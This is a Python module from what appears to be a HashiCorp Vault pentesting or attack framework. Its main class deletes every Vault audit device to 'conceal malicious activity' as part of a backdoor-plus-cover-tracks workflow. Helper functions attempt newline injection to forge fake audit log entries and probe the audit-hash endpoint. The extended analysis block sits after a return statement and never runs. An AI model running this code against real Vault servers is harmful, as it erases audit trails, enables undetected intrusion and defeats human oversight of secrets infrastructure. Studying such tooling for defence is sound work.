# active_execution/modules/audit_backdoor.py
from typing import Optional, Dict, Any
from core.tls_config import vault_request
from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel

class AuditBackdoorModule(BaseExecutionModule):
    """Disable Vault audit devices to conceal malicious activity.

    .. note::
       This module is technically **evasion / anti-forensics**, not persistence.
       It is grouped under the ``"persistence"`` domain because it is almost
       always deployed alongside backdoor modules (``persistence.backdoor``,
       ``multi_persistence.backdoor``) and the same specialist agent should
       own the full "install backdoor + cover tracks" workflow.
    """

    def __init__(self):
        super().__init__(
            module_id="audit_backdoor.disable",
            title="Audit Backdoor - Disable Audit Devices",
            risk_level=RiskLevel.DESTRUCTIVE,
            domain="persistence",
            description=(
                "Disables all audit devices to hide activity. "
                "Technically evasion/anti-forensics (not persistence), "
                "but grouped under 'persistence' domain for practical "
                "backdoor+cover-tracks workflow with a single specialist agent."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(context.token and context.vault_addr)

    def execute(self, context: ExecutionContext, params: Optional[Dict] = None) -> ExecutionResult:
        headers = {"X-Vault-Token": context.token}
        results = {}
        try:
            # List audit devices
            url = f"{context.vault_addr}/v1/sys/audit"
            resp = vault_request("GET", url, headers=headers, timeout=10)
            if resp.status_code != 200:
                return ExecutionResult(
                    status="failed",
                    message=f"Could not list audit devices: {resp.status_code}"
                )
            audits = resp.json().get("data", {})
            results["audit_devices"] = list(audits.keys())
            disabled = []
            for name in audits:
                disable_url = f"{context.vault_addr}/v1/sys/audit/{name}"
                resp_del = vault_request("DELETE", disable_url, headers=headers, timeout=10)
                if resp_del.status_code in [200, 204]:
                    disabled.append(name)
            results["disabled"] = disabled
            context.add_finding(
                title="Audit Logs Disabled",
                description=f"Disabled {len(disabled)} audit devices",
                severity="CRITICAL",
                evidence=results
            )
            return ExecutionResult(
                status="success",
                message=f"Disabled {len(disabled)} audit devices",
                evidence=results
            )
            # ── Extended: Audit config analysis ──────────────────────
            for name, audit_info in audits.items():
                audit_config = audit_info if isinstance(audit_info, dict) else {}
                options = audit_config.get("options", {})
                audit_type = audit_config.get("type", "unknown")

                # Check log_raw
                if options.get("log_raw") is False:
                    context.add_finding(
                        title="INFO: Audit Device log_raw Disabled",
                        description=(
                            f"Audit device '{name}' (type={audit_type}) has log_raw=false. "
                            "Raw request/response bodies are NOT logged — easier to hide "
                            "malicious activity."
                        ),
                        severity="INFO",
                        evidence={"device": name, "log_raw": False},
                    )

                # Check hmac_accessor
                if options.get("hmac_accessor") is True:
                    context.add_finding(
                        title="INFO: Audit Device Uses HMAC Accessor Tracking",
                        description=(
                            f"Audit device '{name}' has hmac_accessor=true. "
                            "Token accessor values are HMAC'd, making token tracking "
                            "possible even without raw tokens in logs."
                        ),
                        severity="INFO",
                        evidence={"device": name, "hmac_accessor": True},
                    )

                # Test syslog newline injection
                if audit_type == "syslog":
                    _test_syslog_injection(
                        context.vault_addr, headers, name, context,
                    )

                # Audit-hash test
                _test_audit_hash(
                    context.vault_addr, headers, name, context,
                )

            results["audit_analysis"] = "completed"

        except Exception as e:
            return ExecutionResult(status="error", message=str(e))


def _test_syslog_injection(
    vault_addr: str, headers: dict, device_name: str, context: ExecutionContext,
) -> None:
    """Test syslog newline injection to forge fake audit log entries."""
    # This tests if newline-injected payloads are accepted by the audit device
    inject_payload = (
        f'{{"time":"2024-01-01T00:00:00Z","type":"response","auth":{{"client_token":"hmac-sha256:fake"}},'
        f'"request":{{"path":"sys/audit/{device_name}"}}}}'
    )
    try:
        from core.tls_config import vault_request
        resp = vault_request(
            "PUT",
            f"{vault_addr}/v1/sys/audit/{device_name}",
            headers=headers,
            json={"description": f"test\n{inject_payload}"},
            timeout=10,
        )
        if resp.status_code in (200, 204):
            context.add_finding(
                title="MEDIUM: Syslog Audit Device — Possible Log Injection",
                description=(
                    f"Audit device '{device_name}' accepted a description containing "
                    "newline characters. This may enable audit log injection attacks."
                ),
                severity="MEDIUM",
                evidence={"device": device_name, "injection_type": "newline"},
            )
    except Exception:
        pass


def _test_audit_hash(
    vault_addr: str, headers: dict, device_name: str, context: ExecutionContext,
) -> None:
    """Test the audit-hash endpoint to check HMAC key accessibility."""
    try:
        from core.tls_config import vault_request
        resp = vault_request(
            "POST",
            f"{vault_addr}/v1/sys/audit-hash/{device_name}",
            headers=headers,
            json={"input": "vault-pentest-test"},
            timeout=10,
        )
        if resp.status_code == 200:
            data = resp.json()
            hmac_val = data.get("data", {}).get("hash", "")
            context.add_finding(
                title="HIGH: Audit-Hash Endpoint Accessible",
                description=(
                    f"Successfully used audit-hash on '{device_name}'. "
                    f"HMAC: {hmac_val[:40]}... "
                    "This endpoint can be used to compute HMACs of arbitrary data "
                    "using the audit device's internal HMAC key."
                ),
                severity="HIGH",
                evidence={"device": device_name, "hmac_prefix": hmac_val[:40]},
            )
    except Exception:
        pass